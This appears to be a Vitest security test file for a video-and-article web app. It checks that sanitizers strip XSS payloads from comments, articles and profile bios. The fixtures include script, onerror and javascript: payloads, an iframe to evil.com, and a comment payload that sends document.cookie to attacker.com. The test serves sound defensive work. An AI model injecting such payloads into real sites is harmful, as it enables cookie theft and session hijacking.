import { describe, it, expect, beforeAll } from "vitest";
import { sanitizeUserHtml, sanitizePlainText } from "@/lib/security/sanitize";
import { addCommentAction } from "@/modules/videos/video.actions";
import { createArticleAction, postArticleCommentAction } from "@/modules/articles/article.actions";
import { updateProfileSettingsAction } from "@/modules/settings/settings.actions";
import { seedTestData, SeedData } from "../setup/seed";
import { db } from "@/db";
import { comments, articles, articleComments, users } from "@/db/schema";
import { eq, desc } from "drizzle-orm";
import { auth } from "@/lib/auth/auth";

describe("0.5 Security: XSS and Script Injection Neutralization Suite", () => {
  let seed: SeedData;
  let userCookie: string;

  beforeAll(async () => {
    seed = await seedTestData();

    const loginRes = await auth.api.signInEmail({
      body: {
        email: "user_a@playtube.test",
        password: "password123",
      },
      asResponse: true,
    });
    userCookie = loginRes.headers.get("set-cookie") || "";
  });

  describe("Unit Sanitizer Tests", () => {
    it("strips <script> and dangerous attributes from rich-text HTML", () => {
      const malicious = '<p>Normal text</p><script>alert("XSS")</script><img src="x" onerror="alert(1)" /><a href="javascript:alert(2)">Click</a>';
      const clean = sanitizeUserHtml(malicious);

      expect(clean).not.toContain("<script>");
      expect(clean).not.toContain("alert");
      expect(clean).not.toContain("onerror");
      expect(clean).not.toContain("javascript:");
      expect(clean).toContain("<p>Normal text</p>");
    });

    it("strips all HTML tags from plain text inputs (bios, comments)", () => {
      const payload = 'Hello <script>alert("bio XSS")</script><b>Bold</b> <img src="pwn.jpg" />';
      const clean = sanitizePlainText(payload);

      expect(clean).not.toContain("<script>");
      expect(clean).not.toContain("alert");
      expect(clean).not.toContain("<img");
      expect(clean).not.toContain("<b>");
      expect(clean).toBe("Hello Bold");
    });
  });

  describe("Comment, Article, and Bio Submission with <script> Payload", () => {
    it("neutralizes <script> payload in video comments", async () => {
      const scriptPayload = 'Great video! <script>document.location="http://attacker.com?c="+document.cookie</script>';
      const userHeaders = new Headers();
      userHeaders.set("cookie", userCookie);

      const res = await addCommentAction({
        videoDbId: seed.videos.publicVideo.id,
        text: scriptPayload,
        customHeaders: userHeaders,
      });

      expect(res.success).toBe(true);

      const [storedComment] = await db
        .select()
        .from(comments)
        .where(eq(comments.videoId, seed.videos.publicVideo.id))
        .orderBy(desc(comments.id))
        .limit(1);

      expect(storedComment.text).not.toContain("<script>");
      expect(storedComment.text).not.toContain("attacker.com");
      expect(storedComment.text).toBe("Great video!");
    });

    it("neutralizes <script> payload in article creation", async () => {
      const form = new FormData();
      form.set("title", 'Article Title <script>alert("title")</script>');
      form.set("description", 'Safe description <script>alert("desc")</script>');
      form.set("text", '<p>Article paragraph</p><script>alert("body")</script><iframe src="evil.com"></iframe>');
      form.set("category", "general");

      const res = await createArticleAction(form);
      expect(res.success).toBe(true);
      expect(res.articleId).toBeDefined();

      const [storedArticle] = await db
        .select()
        .from(articles)
        .where(eq(articles.id, res.articleId!))
        .limit(1);

      expect(storedArticle.title).not.toContain("<script>");
      expect(storedArticle.title).toBe("Article Title");

      expect(storedArticle.description).not.toContain("<script>");
      expect(storedArticle.description).toBe("Safe description");

      expect(storedArticle.text).not.toContain("<script>");
      expect(storedArticle.text).not.toContain("<iframe>");
      expect(storedArticle.text).toContain("<p>Article paragraph</p>");
    });

    it("neutralizes <script> payload in user bio and profile settings", async () => {
      const form = new FormData();
      form.set("firstName", "John");
      form.set("lastName", '<script>alert("name")</script>');
      form.set("about", 'Professional hacker <script>stealTokens()</script><style>body{display:none}</style>');

      const userHeaders = new Headers();
      userHeaders.set("cookie", userCookie);

      // Run profile update
      const res = await updateProfileSettingsAction(form, userHeaders);
      expect(res.success).toBe(true);

      const [storedUser] = await db
        .select()
        .from(users)
        .where(eq(users.id, seed.userA.id))
        .limit(1);

      expect(storedUser.name).not.toContain("<script>");
      expect(storedUser.about).not.toContain("<script>");
      expect(storedUser.about).not.toContain("<style>");
      expect(storedUser.about).toBe("Professional hacker");
    });
  });
});
